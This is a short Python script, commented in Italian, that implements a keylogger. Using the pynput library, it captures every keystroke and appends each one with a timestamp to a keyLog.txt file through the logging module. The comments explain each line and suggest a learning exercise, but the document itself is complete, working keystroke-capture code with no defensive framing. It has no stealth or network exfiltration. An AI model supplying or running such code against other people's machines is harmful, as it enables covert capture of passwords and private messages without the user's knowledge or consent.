import pynput #registra le pressioni della tastiera e mouse
from pynput.keyboard import Key, Listener
import logging #per registrare i dati raccolti in un log_file


log_file_directory = r'path/to/where/the/log_file/will/be'

#CONFIGURAZIONE DEL LOGGER  
# filename sarà nel percorso indicato in log_file_directory e lo chiama keyLog.txt
# level = DEBUG significa che vengono registrati tutti i livelli di log??
# %(asctime)s è la stringa contenente la data e l'ora
# %(message)s è la stringa contenente la pressione del tasto registrata
logging.basicConfig(filename = (log_file_directory + r'/keyLog.txt'), level = logging.DEBUG, format = '%(asctime)s: %(message)s')


# La funzione riceve come argomento key, rappresentante il tasto premuto. 
# Questa funzione registra il tasto premuto convertendolo in stringa e scrivendolo nel file di log utilizzando logging.info()
def on_press(key):
    logging.info(str(key))


# Viene creato un oggetto Listener che rimane in ascolto per i tasti premuti sulla tastiera. Una volta rilevato un tasto premuto, 
# viene chiamata la funzione on_press per gestire l'evento. 
# Il metodo join() blocca l'esecuzione del programma finché il listener non viene arrestato.
with Listener(on_press=on_press) as listener:
    listener.join()



